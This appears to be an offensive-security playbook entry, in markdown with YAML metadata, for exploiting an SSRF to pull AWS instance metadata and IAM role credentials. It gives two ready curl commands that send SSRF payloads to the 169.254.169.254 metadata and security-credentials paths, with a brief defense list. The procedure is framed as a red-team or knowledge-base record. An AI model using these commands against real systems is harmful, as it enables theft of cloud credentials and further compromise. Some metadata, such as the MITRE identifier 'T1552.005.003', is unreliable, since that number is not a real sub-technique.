---
id: p3q4r5s6-t7u8-9012-defg-hi3456789012
name: Exfiltrate-AWS-Metadata
tags:
  - exfiltration
  - aws
  - metadata
  - credentials
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-metadata-fetch]]'
verified: false
platforms:
  - AWS
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Cloud Instance Metadata API]]'
  - '[[Exfiltration Over Alternative Protocol]]'
updated_at: '2025-12-14T17:33:24.210Z'
sub_techniques:
  - '[[T1552.005.003]]'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Cloud Instance Metadata API]]'
  - '[[Exfiltration Over Alternative Protocol]]'
---
# Exfiltrate-AWS-Metadata

## Summary

This procedure uses the established SSRF to query and extract AWS instance metadata, including IAM role credentials, for further compromise.

## Description

AWS EC2 instances expose metadata at 169.254.169.254, containing temporary security credentials if an IAM role is attached. SSRF allows remote access to this without instance control, enabling credential theft and lateral movement.

## Requirements

1. Confirmed SSRF to internal IPs
2. Knowledge of AWS metadata paths (e.g., /latest/meta-data/)
3. Tool for sending crafted requests

## Defense

Defensive measures and detection strategies:

- Attach IMDSv2 to require session tokens for metadata
- Block SSRF at web app layer with WAF rules
- Monitor CloudTrail for anomalous metadata access

## Objectives

1. Retrieve instance and IAM details
2. Extract access keys and tokens
3. Exfiltrate data via application response

## Instructions

### Step 1: Query Basic Metadata

**Context**: Start with instance identity to confirm access.

**Command** ([[commands/curl-metadata-fetch]]):
```bash
curl -X POST 'https://target.com/api/import-from-drive' -H 'Content-Type: application/json' -d '{"url": "https://drive.google.com/uc?export=download&id=ssrf&internal=http://169.254.169.254/latest/meta-data/instance-id"}'
```

> Response includes instance ID if successful.

### Step 2: Fetch IAM Credentials

**Context**: Target security credentials endpoint.

**Command** ([[commands/curl-iam-exfil]]):
```bash
curl -X POST 'https://target.com/api/import-from-drive' -d '{"url": "https://drive.google.com/uc?internal=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"}'
```

> Parse JSON for AccessKeyId, SecretAccessKey, and Token.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Cloud Instance Metadata API]]
- [[Exfiltration Over Alternative Protocol]]

### Sub-Techniques

- [[T1552.005.003]]

## Commands Used

- [[commands/curl-metadata-fetch]]
- [[commands/curl-iam-exfil]]

## Tools Used

- [[tools/curl]]

## Tags

- [[Exfiltration]]
- [[aws]]
